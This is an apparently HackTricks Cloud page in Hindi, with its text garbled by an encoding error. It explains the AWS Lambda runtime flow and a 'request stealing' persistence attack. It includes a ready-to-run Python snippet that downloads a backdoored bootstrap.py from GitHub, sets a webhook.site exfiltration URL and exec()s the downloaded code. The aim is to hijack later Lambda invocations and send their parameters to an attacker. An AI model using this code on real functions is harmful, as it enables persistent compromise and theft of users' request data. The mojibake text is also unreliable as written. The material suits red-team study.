# AWS - Lambda рдЕрдиреБрд░реЛрдз рдЪреБрд░рд╛рдирд╛

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ **рд╣рдореЗрдВ рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

## Lambda рдкреНрд░рд╡рд╛рд╣

<figure><img src="../../../../.gitbook/assets/image (341).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer** рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рдЬреЛ рдХрдВрдЯреЗрдирд░ рдХреЗ рдмрд╛рд╣рд░ рд╣реИ рдФрд░ **invocations** рдХреЛ **init** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рднреЗрдЬрддреА** рд╣реИред
2. Init рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкреЛрд░реНрдЯ **9001** рдкрд░ рд╕реБрдирддреА рд╣реИ рдЬреЛ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддреА рд╣реИ:
* **`/2018-06-01/runtime/invocation/next`** тАУ рдЕрдЧрд▓реА invocation рдШрдЯрдирд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** тАУ invoke рдХреЗ рд▓рд┐рдП рд╣реИрдВрдбрд▓рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд▓реМрдЯрд╛рдПрдВ
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** тАУ рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рддреНрд░реБрдЯрд┐ рд▓реМрдЯрд╛рдПрдВ
3. **bootstrap.py** рдореЗрдВ рдПрдХ рд▓реВрдк рд╣реИ рдЬреЛ init рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ invocations рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╕рдВрднрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреЛрдб рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ (**`/next`**).
4. рдЕрдВрддрддрдГ, **bootstrap.py** init рдХреЛ **response** рднреЗрдЬрддрд╛ рд╣реИ

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ bootstrap рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреЛрдб рдХреЛ рдПрдХ рдореЙрдбреНрдпреВрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреЛрдб рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХреЛрдИ рднреА рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИред

## Lambda рдЕрдиреБрд░реЛрдз рдЪреБрд░рд╛рдирд╛

рдЗрд╕ рд╣рдорд▓реЗ рдХрд╛ рд▓рдХреНрд╖реНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреЛрдб рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг **`bootstrap.py`** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реИ рдЬреЛ рдЙрд╕ **`bootstrap.py`** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ рд╣реИ рдЬреЛ рдХрдордЬреЛрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рд╕рдВрднрд╛рд▓рддреА рд╣реИред рдЗрд╕ рддрд░рд╣, **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг bootstrap** рдкреНрд░рдХреНрд░рд┐рдпрд╛ **init рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдХреЗ рд╕рд╛рде **рдмрд╛рддрдЪреАрдд рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рджреЗрдЧреА** рддрд╛рдХрд┐ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕рдВрднрд╛рд▓рд╛ рдЬрд╛ рд╕рдХреЗ рдЬрдмрдХрд┐ **рд╡реИрдз** bootstrap **рдлрдВрд╕** рдЧрдпрд╛ рд╣реИ рдЬреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ init рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЕрдиреБрд░реЛрдз рдирд╣реАрдВ рдорд╛рдВрдЧреЗрдЧрд╛ред

рдпрд╣ рдПрдХ рд╕рд░рд▓ рдХрд╛рд░реНрдп рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдХреЛрдб рд╡реИрдз **`bootstrap.py`** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

* **Init рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╡рд░реНрддрдорд╛рди invocation рдХрд╛ рдПрдХ рдирдХрд▓реА рдкрд░рд┐рдгрд╛рдо рднреЗрдЬреЗрдВ**, рддрд╛рдХрд┐ init рд╕реЛрдЪрддрд╛ рд╣реИ рдХрд┐ bootstrap рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЕрдзрд┐рдХ invocations рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░ рд░рд╣реА рд╣реИред
* рдПрдХ рдЕрдиреБрд░реЛрдз **`/${invoke-id}/response`** рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП
* Invoke-id рдХреЛ рд╡реИрдз **`bootstrap.py`** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕реНрдЯреИрдХ рд╕реЗ [**inspect**](https://docs.python.org/3/library/inspect.html) рдкрд╛рдпрдерди рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЬреИрд╕рд╛ рдХрд┐ [рдпрд╣рд╛рдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд╣реИ](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)) рдпрд╛ рдмрд╕ рдЗрд╕реЗ рдлрд┐рд░ рд╕реЗ **`/2018-06-01/runtime/invocation/next`** рдкрд░ рдЕрдиреБрд░реЛрдз рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЬреИрд╕рд╛ рдХрд┐ [рдпрд╣рд╛рдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд╣реИ](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)).
* рдЕрдЧрд▓реА invocations рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг **`boostrap.py`** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ
* рдЫрд┐рдкрд╛рдиреЗ рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдирд┐рдпрдВрддреНрд░рд┐рдд C2 рдкрд░ lambda invocations рдкреИрд░рд╛рдореАрдЯрд░ рднреЗрдЬрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдлрд┐рд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рд╕рдВрднрд╛рд▓реЗрдВред
* рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП, **`bootstrap.py`** рдХрд╛ рдореВрд▓ рдХреЛрдб рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдпрд╛ [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py) рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛, рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдЬреЛрдбрд╝рдирд╛ рдФрд░ рдЗрд╕реЗ рд╡рд░реНрддрдорд╛рди lambda invocation рд╕реЗ рдЪрд▓рд╛рдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред

### рд╣рдорд▓реЗ рдХреЗ рдЪрд░рдг

1. рдПрдХ **RCE** рднреЗрджреНрдпрддрд╛ рдЦреЛрдЬреЗрдВред
2. рдПрдХ **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг** **bootstrap** рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ (рдЬреИрд╕реЗ [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг bootstrap** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред

рдЖрдк рдЗрди рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдЪрд▓рд╛рдХрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
For more info check [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)

## References

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
